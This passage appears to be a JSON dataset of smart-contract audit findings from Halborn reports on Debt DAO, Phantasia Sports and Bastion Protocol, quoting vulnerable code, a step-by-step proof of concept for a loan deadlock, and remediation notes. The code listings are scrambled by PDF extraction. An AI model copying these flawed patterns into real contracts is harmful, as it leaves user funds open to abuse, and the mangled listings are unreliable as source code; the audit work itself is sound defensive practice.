whileBorrowing () { require ( ids . length > 0 && credits [ ids [0]]. principal > 0) ; _ ; } To escape from the situation, the borrower can still borrow() any amount from the first position unless the lender does not withdraw all liquidity. The withdrawal operation accrues the interest, which cannot be paid, as Moreover, the whileBorrowing() modifier only considers the principal. the borrower cant borrow() anymore from the empty deposit. As a result, a deadlock occurs in the contract, and the borrower cant pay off the debt. The root cause of this issue is the _sortIntoQ(bytes32 p) function, which supposes to shift the credit position with the borrowed deposit to the beginning of the ids collection, but it does not work as expected. Sample invalid flow: 1. For i = 0; _i = i = 0 as first credits principal is 0. 2. For i = 1, function returns true, as _i = 0. 3. No position swap occurs. Listing 19: LineOfCredit.sol uint256 len = ids . length ; uint256 _i = 0; // index that p should be moved to 682 function _sortIntoQ ( bytes32 p ) internal returns ( bool ) { 683 684 685 686 687 688 689 bytes32 id = ids [ i ]; if (p != id ) { for ( uint256 i = 0; i < len ; i ++) { if ( credits [ id ]. principal > 0) continue ; // `id `  should be placed before `p ` 690 691 692 _i = i ; // index of first undrawn LoC found } else { if ( _i == 0) return true ; // `p ` in earliest 60  possible index 693 694 695 696 697 698 699 700 // swap positions ids [ i] = ids [ _i ]; ids [ _i ] = p; } } return true ; } Proof of Concept: 1. All necessary contracts are deployed and initialized: RevenueToken, SimpleOracle, LoanLib, LineOfCredit. 2. As borrower and lender1, add credit position for 10_000_000_000_- 000_000 tokens. This action registers the first credit position. 3. As a borrower and lender2, add credit position for 10_000_000_000_- 000_000 tokens. This action registers the second credit position. 4. As the borrower, borrow 10_000_000_000_000_000 tokens from the second position. 5. Note that the ids collection was not updated; the second credit position is not set to the first. 6. Forward blockchain time for 1 second. 7. Call the accrueInterest function. Note that the interestAccrued parameter value in the first credit record is updated. 8. As the borrower, attempt to depositAndRepay with any value. Observe that the transaction reverted. 9. As the borrower, attempt to depositAndClose. Observe that the transaction reverted. 61 10. As the borrower, attempt to close the first credit position. Observe that the transaction reverted with Loan: close failed. credit owed error. 11. As the lender2, attempt to close the second credit position. Observe that the transaction reverted with Loan: close failed. credit owed error. 12. As the lender1, withdraw all liquidity. 13. As the borrower, attempt to borrow. Observe that the transaction reverted with a Loan: no liquidity error. 14. As the borrower, attempt to close the first credit position again. Observe that the transaction reverted with Loan: close failed. credit owed error. 62 Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to allow the borrower to pay off any credit position without extra steps (such as calling borrow() function). Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit 78a2a57081ee1242ab71a09e1f28218de4e03b65: the _sortIntoQ() function has now proper implementation. The borrowed line of credit now moves to the first position to pay off. 63 3.10 (HAL-10) UPDATEOWNERSPLIT FUNCTION CAN BE ABUSED BY LENDER OR BORROWER - HIGH ", "labels": ["Halborn", "Debt_DAO_P2P_Loan", "Severity: Informational"]}, {"title": "ANONYMOUS FAN CARD MODIFICATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "Users can create and update fan cards with the UpdateOrCreateFanCard instruction. Along with the instruction data they have to provide several accounts, one of them being fan_card_storage_account. This account stores a FanCard struct. The struct is defined in util.rs and has multiple fields, including user_main: Pubkey. This field denotes the card creator. The UpdateOrCreateFanCard instruction handler does not validate the transaction signer account address to match user_main of the provided fan_card_storage_account and in consequence a malicious user may over- write all fan cards. Code Location: Listing 1: processor/update_or_create_fan_card_v1.rs (Lines 23,25,29) let account_info_iter = & mut accounts . iter () ; let user_main_account = next_account_info ( account_info_iter ) ?; accounts : &[ AccountInfo ], 19 pub fn process_update_or_create_fan_card_v1 ( 20 21 ) -> ProgramResult { 22 23 24 25 26 27 28 29 if !user_main_account . is_signer { } let fan_card_storage_account = next_account_info ( return Err ( ProgramError :: MissingRequiredSignature ); account_info_iter ) ?; 13 Listing 2: processor/update_or_create_fan_card_v1.rs (Lines 125) 103 let mut fan_card_data_byte_array = fan_card_storage_account . data . 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 try_borrow_mut () . unwrap () ; if fan_card_data_byte_array [0] == 0 u8 { let rent = Rent :: get () ?; if !rent . is_exempt ( fan_card_account_lamports , fan_card_data_bytes ) { msg! ( \" PhantasiaError :: NotRentExempt \" ); return Err ( PhantasiaError :: NotRentExempt . into () ); } if fan_card_data_bytes ! = state :: FAN_CARD_STORAGE_TOTAL_BYTES { msg! ( \" PhantasiaError :: DataSizeNotMatched \" ); return Err ( PhantasiaError :: DataSizeNotMatched . into () ); } fan_card_data_byte_array [0] = AccTypesWithVersion :: FanCardDataV1 as u8 ; } else if fan_card_data_byte_array [0] ! = AccTypesWithVersion :: FanCardDataV1 as u8 { msg! (\" PhantasiaError :: ExpectedAccountTypeMismatched \" ); return Err ( PhantasiaError :: ExpectedAccountTypeMismatched . into () ); } let user_fan_card : FanCard = FanCard { user_main : * user_main_account . key , Risk Level: Likelihood - 5 Impact - 3 Recommendations: Validate the user_main_account key to match user_main on card update. 14 Remediation Plan: The Phantasia Sports team SOLVED: 5c83e22e08086abad97119860485316c013ae748. validates if the transaction signer is the owner of the fan card. in instruction issue fixed The the commit handler 15 ", "labels": ["Halborn", "Phantasia_Sports_Solana_Program", "Severity: High"]}, {"title": "CONTEST DOS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "Users can join contests by sending the AddOrUpdateParticipantData in- struction. The instruction handler however does not verify if the user has already submitted a roster which combined with other vulnerabilities identified in the program allows a single attacker to fill up any and all contests with bogus or duplicated entries thus preventing legitimate users from entering contests. An attack of this type doesnt carry any immediate loss of funds risk however it would be extremely harmful to the protocol to be unable to carry out normal operations. Code Location: Listing 3: processor/add_or_update_participant_data.rs (Lines 20,22) accounts : &[ AccountInfo ], roster_9_players_input : [ u32 ; 9] , participant_index_input : u16 , 14 pub fn process_add_or_update_participant_data ( 15 16 17 18 ) -> ProgramResult { 19 20 let account_info_iter = & mut accounts . iter () ; let participant_main_account = next_account_info ( account_info_iter ) ?; 21 22 23 24 25 if !participant_main_account . is_signer { msg! (\" ProgramError :: MissingRequiredSignature \" ); return Err ( ProgramError :: MissingRequiredSignature ); } Listing 4: processor/add_or_update_participant_data.rs (Lines 71,88) 70 let participant_data = ParticipantDataV1 { 71 72 73 participant_main_pkey : * participant_main_account . key , roster_9_players : roster_9_players_input , last_updated_timestamp : now , 16 74 }; 75 state :: pack_to_participant_v1 ( 76 77 participant_data , & mut contest_data_byte_array [ participant_data_si .. participant_data_ei ], 78 ) 79 . unwrap () ; 80 } else { 81 let participant_data_si = state :: CONTEST_INFO_HEADER_V1_DATA_BYTES 82 + ( participant_index_input as usize ) * state :: PARTICIPANT_V1_DATA_BYTES ; 83 let participant_data_ei = participant_data_si + state :: PARTICIPANT_V1_DATA_BYTES ; 84 let mut participant_data = state :: unpack_to_participant_v1 ( 85 & contest_data_byte_array [ participant_data_si .. participant_data_ei ], 86 ) 87 . unwrap () ; 88 if participant_data . participant_main_pkey ! = * participant_main_account . key { msg! ( \" PhantasiaError :: WrongParticipantIndex \" ); return Err ( PhantasiaError :: WrongParticipantIndex . into () ); 89 90 91 } Risk Level: Likelihood - 5 Impact - 3 Recommendations: Restrict the number of rosters per participant_main_account to one. Remediation Plan: The Phantasia Sports team SOLVED: d19c0f12f26ddce1adc605ce19ca24a085acefb6. participant_main_account is restricted to one now. fixed the commit The number of rosters per issue in 17 ", "labels": ["Halborn", "Phantasia_Sports_Solana_Program", "Severity: High"]}, {"title": "HARDCODED GOVERNANCE ADDRESS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "The ClaimContestPrizes, CreateWinnersAccountV1, CloseWinnersAccount and TransferNFTtoWinner instruction handlers use the get_admin_pubkey() util- This function returns a ity function to validate the signer address. hardcoded governance account address. Since this address is hardcoded it cannot be modified without redeploying the program if the account compromised. Code Location: Listing 5: utils.rs (Lines 13) 8 pub fn get_admin_pubkey () -> Pubkey { 9 10 let admin_pubkey_str : & ' static str = env! (\" ADMIN_PUBKEY \" , \" Must specify a admin account public key! \" ); msg! ( \" the ADMIN_PUBKEY variable at the time of compiling was : {} \" , admin_pubkey_str ); let pubkey_vec = bs58 :: decode ( admin_pubkey_str ). into_vec () . unwrap () ; let admin_pubkey = Pubkey :: new (& pubkey_vec ); return admin_pubkey ; 11 12 13 14 15 16 17 18 } Listing 6: processor/claim_contest_prizes.rs (Lines 127) 124 if winners_header_data_v1 . num_prizes_claimed == winners_header_data_v1 . num_winner { let admin_main_account = next_account_info ( account_info_iter ) ?; let admin_pubkey = utils :: get_admin_pubkey () ; 125 126 127 18 Listing 7: processor/create_winners_account_v1.rs (Lines 30) msg! ( \" ProgramError :: MissingRequiredSignature \" ); return Err ( ProgramError :: MissingRequiredSignature ); 25 if !admin_main_account . is_signer { 26 27 28 } 29 30 let admin_pubkey = utils :: get_admin_pubkey () ; 31 32 if admin_pubkey ! = * admin_main_account . key { 33 34 35 } msg! ( \" PhantasiaError :: AdminDoesNotMatched \" ); return Err ( PhantasiaError :: AdminDoesNotMatched . into () ); Also processor/close_winners_account.rs lines #14-23 and processor/ transfer_nft_to_winner.rs lines #19-28. Risk Level: Likelihood - 3 Impact - 3 Recommendations: Implement governance functions to update the admin account address. Remediation Plan: ACKNOWLEDGED: The Phantasia Sports team acknowledged this finding. 19 ", "labels": ["Halborn", "Phantasia_Sports_Solana_Program", "Severity: Medium"]}, {"title": "SALARY CAP CONTEST PARAMETER VALIDATION MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "salary_cap if one of the contest parameters creators specify on ini- On the front-end, the web application verifies if total tialization. roster salary does not exceed the salary_cap for a contest and sends the AddOrUpdateParticipantData instruction. This parameter is not validated again by the program because player IDs in roster_9_players_input arrays do not identify any on-chain objects. In consequence, a malicious par- ticipant may create a roster which exceeds the salary_cap for a contest and/or flood the program with invalid participant data thus preventing legitimate users from playing the game and winning awards. Code Location: Listing 8: processor/initialize_contest_account.rs (Lines 16) accounts : &[ AccountInfo ], max_players_in_contest_input : u16 , first_game_start_time_input : u32 , contest_league_input : u8 , salary_cap_input : u16 , game_type_input : u8 , 11 pub fn process_initialize_contest_account_v1 ( 12 13 14 15 16 17 18 ) -> ProgramResult { 19 let account_info_iter = & mut accounts . iter () ; Listing 9: processor/initialize_contest_account.rs (Lines 58) 52 let contest_header_data = ContestInfoHeaderV1 { 53 54 55 56 acc_type : AccTypesWithVersion :: ContestDataV1 as u8 , contest_creater_main_pkey : * contest_creater_main_account . key , players_joined_contest : 0 u16 , max_players_in_contest : max_players_in_contest_input , 20 first_game_start_time : first_game_start_time_input , contest_league : contest_league_input , salary_cap : salary_cap_input , game_type : game_type_input , 57 58 59 60 61 }; 62 63 state :: pack_to_contest_info_header_v1 ( 64 65 contest_header_data , & mut contest_data_byte_array [ state :: CONTEST_HEADER_V1_SI .. state :: CONTEST_HEADER_V1_EI ], 66 ) 67 . unwrap () ; Listing 10: state.rs (Lines 13,14) 12 pub enum ContestLeague { 13 14 15 } NFL = 1, NBA = 2, Risk Level: Likelihood - 2 Impact - 4 Recommendations: Implement the contest_league_input parameter validation logic in the InitializeContestAccountV1 instruction handler. Remediation Plan: ACKNOWLEDGED: The Phantasia Sports team acknowledged this finding. 21 ", "labels": ["Halborn", "Phantasia_Sports_Solana_Program", "Severity: Medium"]}, {"title": "LEAGUE/GAME TYPE CONTEST PARAMETERS VALIDATION MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "contest_league and game_type are two of the contest parameters creators specify on initialisation. In state.rs, enum ContestLeague defines avail- able leagues. The InitializeContestAccountV1 instruction handler does not ensure the user-supplied contest_league_input is a valid ContestLeague enum variant nor it verifies the game_type_input parameter value. This means users can create contests of arbitrary types and arbitrary games. Code Location: Listing 11: processor/initialize_contest_account.rs (Lines 58) acc_type : AccTypesWithVersion :: ContestDataV1 as u8 , contest_creater_main_pkey : * contest_creater_main_account . key , players_joined_contest : 0 u16 , max_players_in_contest : max_players_in_contest_input , first_game_start_time : first_game_start_time_input , contest_league : contest_league_input , salary_cap : salary_cap_input , game_type : game_type_input , 52 let contest_header_data = ContestInfoHeaderV1 { 53 54 55 56 57 58 59 60 61 }; 62 63 state :: pack_to_contest_info_header_v1 ( 64 65 contest_header_data , & mut contest_data_byte_array [ state :: CONTEST_HEADER_V1_SI .. state :: CONTEST_HEADER_V1_EI ], 66 ) 67 . unwrap () ; 22 Listing 12: state.rs (Lines 13,14) 12 pub enum ContestLeague { 13 14 15 } NFL = 1, NBA = 2, Risk Level: Likelihood - 1 Impact - 3 Recommendations: Implement the contest_league_input parameter validation logic in the InitializeContestAccountV1 instruction handler. Remediation Plan: SOLVED: 28e770a9554267d95348c7c7d6feabde6c3aaffb. The validate_game_and_league_type Phantasia Sports team commit issue fixed the The in function was implemented. 23 ", "labels": ["Halborn", "Phantasia_Sports_Solana_Program", "Severity: Low"]}, {"title": "INTEGER OVERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "An overflow happens when an arithmetic operation attempts to create a numeric value that is outside the range that can be represented with For example, in line #57 in processor/claim\\ a given number of bits. textunderscore contest\\textunderscore prizes.rs two u16 values are mul- tiplied without checking whether the result is within the range that can be represented with a given number of bits. If it isnt, in Rust the resulting value is specified to wrap as twos complement, resulting in a value either too low or too high considering the circumstances. Code Location: Listing 13: processor/claim_contest_prizes.rs (Lines 57) 46 let mut winners_header_data_v1 = state :: unpack_to_winner_data_header_v1 ( 47 48 49 50 51 52 53 54 55 56 57 58 59 & winners_storage_data_byte_array [ state :: WINNER_DATA_HEADER_V1_SI .. state :: WINNER_DATA_HEADER_V1_EI ], true , ) ?; if winners_header_data_v1 . acc_type ! = state :: AccTypesWithVersion :: WinnersDataV1 as u8 { msg! (\" PhantasiaError :: ExpectedAccountTypeMismatched \" ); return Err ( PhantasiaError :: ExpectedAccountTypeMismatched . into () ); } let winner_data_si : usize = state :: WINNER_DATA_HEADER_V1_BYTES + ( winner_index_input as usize ) * ( state :: WINNER_DATA_V1_BYTES ); let winner_data_ei : usize = winner_data_si + state :: WINNER_DATA_V1_BYTES ; let mut current_winner_data : WinnerDataV1 = state :: unpack_to_winner_data_v1 ( 24 60 61 62 & winners_storage_data_byte_array [ winner_data_si .. winner_data_ei ], ) . unwrap () ; Listing 14: processor/add_or_update_participant _data.rs (Lines 59,60) if now > contest_header_data . first_game_start_time { msg! (\" PhantasiaError :: GameAlreadyStarted \" ); return Err ( PhantasiaError :: GameAlreadyStarted . into () ); 51 if participant_index_input == 50 _000u16 { 52 53 54 55 56 57 let participant_data_si = state :: } CONTEST_INFO_HEADER_V1_DATA_BYTES + (( contest_header_data . players_joined_contest as usize ) * state :: PARTICIPANT_V1_DATA_BYTES ); let participant_data_ei = participant_data_si + state :: 58 59 60 PARTICIPANT_V1_DATA_BYTES ; Listing 15: processor/add_or_update_participant _data.rs (Lines 82,83) 81 let participant_data_si = state :: CONTEST_INFO_HEADER_V1_DATA_BYTES + ( participant_index_input as usize ) * state :: 82 PARTICIPANT_V1_DATA_BYTES ; let participant_data_ei = participant_data_si + state :: PARTICIPANT_V1_DATA_BYTES ; let mut participant_data = state :: unpack_to_participant_v1 ( & contest_data_byte_array [ participant_data_si .. participant_data_ei ], ) . unwrap () ; if participant_data . participant_main_pkey != * participant_main_account . key { msg! (\" PhantasiaError :: WrongParticipantIndex \"); return Err ( PhantasiaError :: WrongParticipantIndex . into () ); } 83 84 85 86 87 88 89 90 91 25 Risk Level: Likelihood - 1 Impact - 3 Recommendations: Consider using the checked_add and checked_mul methods instead of ad- dition and multiplication operators respectively, to handle overflows gracefully. Remediation Plan: SOLVED: 28e770a9554267d95348c7c7d6feabde6c3aaffb. Phantasia Sports team The fixed the issue in commit 26 ", "labels": ["Halborn", "Phantasia_Sports_Solana_Program", "Severity: Low"]}, {"title": "INDEX OUT OF BOUNDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "To create a Solana account, a client generates a keypair and registers its public key using the CreateAccount system instruction with a fixed storage size in bytes preallocated. The following instruction handlers: - InitializeJoiningFeeCollectionRecordAccount - InitializeCircularlySortedTimestampStorageAccount - InitializeStakeUsersStorageAccount expect some user-supplied accounts storage sizes to be at least two bytes but do not verify it which will lead to program panic if the size is lower than two bytes. Code Location: Listing 16: processor.rs (Lines 1653,1654) 1633 let league_entry_fee_collection_storage_account = next_account_info ( account_info_iter ) ?; league_entry_fee_collection_storage_account . lamports () , league_entry_fee_collection_storage_account . data_len () , 1634 1635 let rent = Rent :: get () ?; 1636 1637 if !rent . is_exempt ( 1638 1639 1640 ) { 1641 1642 } 1643 1644 let mut league_entry_fee_collection_byte_array_data = 1645 1646 1647 1648 1649 if league_entry_fee_collection_byte_array_data [0] ! = 0 { return Err ( PhantasiaError :: NotRentExempt . into () ); league_entry_fee_collection_storage_account . data . borrow_mut () ; 27 1650 return Err ( PhantasiaError :: LeagueEntryFeeCollectionAccountAlreadyInitialized . into () ); 1651 } 1652 1653 league_entry_fee_collection_byte_array_data [0] = 1 u8 ; 1654 league_entry_fee_collection_byte_array_data [1] = 6 u8 ; Risk Level: Likelihood - 1 Impact - 3 Recommendations: Validate the user-supplied accounts storage size to match the expected one. Remediation Plan: The Phantasia Sports team SOLVED: 28e770a9554267d95348c7c7d6feabde6c3aaffb. the program. fixed the commit This code was removed from issue in 28 ", "labels": ["Halborn", "Phantasia_Sports_Solana_Program", "Severity: Low"]}, {"title": "POSSIBLE MISUSE OF HELPER METHODS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "The intention and use of helper methods in Rust, like unwrap, is very useful for testing environments because a value is forcibly demanded to get an error (aka panic!) if the Option the methods is called on doesnt have Some value or Result. Nevertheless, leaving unwrap functions in production environments is a bad practice because not only will this In addition, no helpful cause the program to crash out, or panic!. messages are shown to help the user solve, or understand the reason of the error. Code Location: Note: some usages of unwrap are justified and were excluded from the listing below. Listing 17 1 auditor@halborn :~/ src / phantasia / $ git grep -n ' unwrap () ' 2 nstruction . rs :108: roster_9_players_input : u8_array_to_u32_array (& input [1..37]. try_into () . unwrap () ) , 3 processor / add_or_update_participant_data . rs :34: let mut contest_data_byte_array = contest_account . data . try_borrow_mut () . unwrap () ; 4 processor / add_or_update_participant_data . rs :41: 5 processor / add_or_update_participant_data . rs :68: 6 processor / add_or_update_participant_data . rs :79: 7 processor / add_or_update_participant_data . rs :87: 8 processor / add_or_update_participant_data . rs :98: 9 processor / claim_contest_prizes . rs :39: . unwrap () ; . unwrap () ; . unwrap () ; . unwrap () ; . unwrap () ; winners_storage_account . data . try_borrow_mut () . unwrap () ; 10 processor / claim_contest_prizes . rs :62: 11 processor / claim_contest_prizes . rs :108: 12 processor / claim_contest_prizes . rs :121: 13 processor / claim_contest_prizes . rs :139: 14 processor / claim_contest_prizes . rs :146: . unwrap () ; . unwrap () ; . unwrap () ; . unwrap () ; . unwrap () ; 29 15 processor / close_winners_account . rs :34: 16 processor / create_winners_account_v1 . rs :50: . unwrap () ; let mut contest_data_byte_array = contest_account . data . try_borrow_mut () . unwrap () ; 17 processor / create_winners_account_v1 . rs :56: 18 processor / create_winners_account_v1 . rs :82: . unwrap () ; winners_storage_account . data . try_borrow_mut () . unwrap () ; 19 processor / create_winners_account_v1 . rs :119: 20 processor / create_winners_account_v1 . rs :131: 21 processor / create_winners_account_v1 . rs :139: . unwrap () ; . unwrap () ; . unwrap () as u64 ; 22 processor / create_winners_account_v1 . rs :142: 23 processor / create_winners_account_v1 . rs :185: 24 processor / create_winners_account_v1 . rs :213: 25 processor / create_winners_account_v1 . rs :221: 26 processor / initialize_contest_account_v1 . rs :38: . unwrap () ; . unwrap () ; . unwrap () ; . unwrap () ; . unwrap () ; 27 processor / initialize_contest_account_v1 . rs :45: let mut contest_data_byte_array = contest_account . data . try_borrow_mut () . unwrap () ; 28 processor / initialize_contest_account_v1 . rs :67: 29 processor / transfer_nft_to_winner . rs :94: 30 processor / update_or_create_fan_card_v1 . rs :103: . unwrap () ; let mut . unwrap () ; fan_card_data_byte_array = fan_card_storage_account . data . try_borrow_mut () . unwrap () ; 31 processor / update_or_create_fan_card_v1 . rs :136: . copy_from_slice (& user_fan_card . try_to_vec () . unwrap () ); 32 utils . rs :15: let pubkey_vec = bs58 :: decode ( admin_pubkey_str ). into_vec () . unwrap () ; 33 utils . rs :25: 34 utils . rs :31: return bytes . try_into () . unwrap () ; bytes . push ( u32 :: from_le_bytes ( inp [ ind .. ind + 4]. try_into () . unwrap () )) ; 35 utils . rs :33: return bytes . try_into () . unwrap () ; Risk Level: Likelihood - 1 Impact - 1 30 Recommendations: It is recommended not use the unwrap function in production environment because this use provokes panic! and may crash the contract without verbose error messages. Crashing the system will result in a loss of availability, and in some cases, even private information stored in the Some alternatives are possible, such as propagating the error state. with ? instead of unwrap or using the error-chain crate for errors. Remediation Plan: SOLVED: 067f426ea3c75a733f0765791f010f333da00d5b. Phantasia Sports team The fixed the issue in commit 31 ", "labels": ["Halborn", "Phantasia_Sports_Solana_Program", "Severity: Informational"]}, {"title": "MISSING CONTEST CREATOR VALIDATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "the Two accounts of requires On account initialization, the initialize_contest_account_v1 function saves the contest creator public key as contest_creater_main_pkey instruction . the to handler and contest_creater_main_account. The handler does not validate if the user-supplied contest_creater_main_account parameter value matches the contest_creater_main_pkey property of contest_account. This means users can provide arbitrary addresses as contest_creater_main_accounts. CreateWinnersAccountV1 are provide contest_account caller the Code Location: Listing 18: processor/initialize_contest_account_v1.rs (Lines 54) acc_type : AccTypesWithVersion :: ContestDataV1 as u8 , contest_creater_main_pkey : * contest_creater_main_account . key , players_joined_contest : 0 u16 , max_players_in_contest : max_players_in_contest_input , first_game_start_time : first_game_start_time_input , contest_league : contest_league_input , salary_cap : salary_cap_input , game_type : game_type_input , 52 let contest_header_data = ContestInfoHeaderV1 { 53 54 55 56 57 58 59 60 61 }; 62 63 state :: pack_to_contest_info_header_v1 ( 64 65 contest_header_data , & mut contest_data_byte_array [ state :: CONTEST_HEADER_V1_SI .. state :: CONTEST_HEADER_V1_EI ], 66 ) 67 . unwrap () ; 32 Listing 19: create_winners_account_v1.rs (Lines 41) 37 let contest_account = next_account_info ( account_info_iter ) ?; 38 39 let winners_storage_account = next_account_info ( account_info_iter ) ?; 40 41 42 43 44 45 46 47 48 let contest_creater_main_account = next_account_info ( account_info_iter ) ?; let rent = Rent :: get () ?; if contest_account . owner != program_id { msg! (\" PhantasiaError :: WrongAccountPassed \" ); return Err ( PhantasiaError :: WrongAccountPassed . into () ); } Risk Level: Likelihood - 1 Impact - 1 Recommendations: Implement validation of the contest_creater_main_account address in the CreateWinnersAccountV1 instruction handler. Remediation Plan: The Phantasia Sports team SOLVED: 28e770a9554267d95348c7c7d6feabde6c3aaffb. validates the contest creator now. fixed the The issue in instruction commit handler 33 3.10 (HAL-10) CREATING FAN CARDS FROM FROZEN NFTS ALLOWED - INFORMATIONAL ", "labels": ["Halborn", "Phantasia_Sports_Solana_Program", "Severity: Informational"]}, {"title": "IMPROPER ROLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that most of the privileged functionality is controlled by the admin. Additional authorization levels are needed to implement the principle of least privilege, also known as least authority, which ensures only authorized processes, users, or programs can access necessary resources or information. Although the contract defines roles responsible for various actions, they can be bypassed by admin. Code Location: The owner can access those functions in Comptroller contract:  _setRewardDistributor  _setPriceOracle  _setCloseFactor  _setCollateralFactor  _setMaxAssets  _setLiquidationIncentive  _supportMarket The owner can bypass role-based access control of those functions in Comptroller:  _setMarketBorrowCaps  _setMintPaused  _setBorrowPaused  _setTransferPaused  _setSeizePaused 14 Risk Level: Likelihood - 3 Impact - 4 Recommendation: Removing the admin bypass in functions is advised. In conjunction, using a multi-signature wallet for admin should also be implemented. However, to increase the decentralization of the protocol, it is highly encouraged to implement a governance mechanism. Every significant change should first undergo a voting process and be implemented only if consensus among voters is reached. Remediation Plan: PENDING: The Bastion Protocol team confirmed that both the owner and pause guardian are controlled by the teams gnosis and will later be handed to the Timelock contract. 15 ", "labels": ["Halborn", "Bastion_Protocol_EVM_Contracts", "Severity: Medium"]}, {"title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT RECIPIENTS CONFIRMATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It is observed that the owner can transfer ownership of the contract However, such an operation does not require to a different address. a confirmation from the new owners address. Incorrect use of such functionality can lead to losing control over contracts, which could not be undone. Code Location: Listing 1: contracts/LockdropVaultV2.sol (Line 85) require ( newOwner != address (0) , \" DANGER : Attempted to set 82 function setOwner ( address newOwner ) external onlyOwner returns (  bool ) { 83  owner to 0\" ); 84  away ownership \"); 85 86 } require ( newOwner != address ( this ) , \" DANGER : Attempted to throw owner = newOwner ; Listing 2: contracts/Oracle/FluxOracle.sol (Line 112) address oldAdmin = admin ; admin = newAdmin ; 110 function setAdmin ( address newAdmin ) external onlyAdmin () { 111 112 113 114 115 } emit NewAdmin ( oldAdmin , newAdmin ); 16 Listing 3: contracts/Oracle/FluxOracleV1.sol (Line 102) address oldAdmin = admin ; admin = newAdmin ; 100 function setAdmin ( address newAdmin ) external onlyAdmin () { 101 102 103 104 105 } emit NewAdmin ( oldAdmin , newAdmin ); Listing 4: contracts/Oracle/NEAROracle.sol (Line 114) address oldAdmin = admin ; admin = newAdmin ; 112 function setAdmin ( address newAdmin ) external onlyAdmin () { 113 114 115 116 117 } emit NewAdmin ( oldAdmin , newAdmin ); Listing 5: contracts/Oracle/StNearFeedV1.sol (Line 41) address oldAdmin = admin ; admin = newAdmin ; 39 function setAdmin ( address newAdmin ) external onlyAdmin () { 40 41 42 43 44 } emit NewAdmin ( oldAdmin , newAdmin ); Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to split the ownership transfer functionality into owner setter and acceptOwnership functions. The latter function allows the transfer to be completed by the recipient. 17 Remediation Plan: The solved Bastion Protocol team SOLVED: commit 52f563f88f08f7ee7217fead1d03d8e50b8ccb33 for the FluxOracle contract, which was later renamed to BastionOracle. Furthermore, the Bastion Protocol team confirmed that only the BastionOracle contract will be used from now on, so other contracts reported in this finding are not corrected. issue this in 18 ", "labels": ["Halborn", "Bastion_Protocol_EVM_Contracts", "Severity: Medium"]}, {"title": "MISSING DIVISION BY 0 CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The HomoraMath library defines divCeil and fdiv functions, which both implement a division. They are, however, missing the division by 0 check, which will cause an error if encountered. Code Location: Listing 6: contracts/HomoraMath.sol (Line 11) 10 function divCeil ( uint256 lhs , uint256 rhs ) internal pure returns (  uint256 ) { 11 12 } return lhs . add ( rhs ). sub (1) / rhs ; Listing 7: contracts/HomoraMath.sol (Line 19) 18 function fdiv ( uint256 lhs , uint256 rhs ) internal pure returns (  uint256 ) { 19 20 } return lhs . mul (2**112) / rhs ; Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to implement a validation mechanism, which will make sure that division by 0 scenarios are handled properly. 19 Remediation Plan: SOLVED: eea975f0489d636687d83fb69534c4c6b31b2e7e Bastion Protocol team The solved this issue in commit 20 ", "labels": ["Halborn", "Bastion_Protocol_EVM_Contracts", "Severity: Medium"]}, {"title": "USE OF DEPRECATED CHAINLINK API", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "LPOracle contracts use Chainlinks deprecated API The NEAROracle, latestAnswer(). Such functions might suddenly stop working if Chainlink This method will return the last stopped supporting deprecated APIs. value, but it is possible to check if the data is fresh. Code Location: Listing 8: contracts/Oracle/NEAROracle.sol (Lines 68,70,76,78) } else { if ( decimalDelta > 0) { if ( feed . decimals () > 18) { return uint ( feed . latestAnswer () ). div (10** decimalDelta ) // Chainlink USD - denominated feeds store answers at 8 decimals uint decimalDelta = uint ( feed . decimals () ). sub ( uint (18) ); 62 function getChainlinkPrice ( AggregatorV2V3Interface feed ) internal  view returns ( uint ) { 63 64 65 66 67 68  ; 69 70 71 72 73 74 75 76  ; 77 78 79 80 81 } uint decimalDelta = uint (18) . sub ( uint ( feed . decimals () )); // Ensure that we don 't multiply the result by 0 if ( decimalDelta > 0) { return uint ( feed . latestAnswer () ); return uint ( feed . latestAnswer () ); return uint ( feed . latestAnswer () ). mul (10** decimalDelta ) } } else { } else { } } 21 Listing 9: contracts/Oracle/LPOracle.sol (Lines 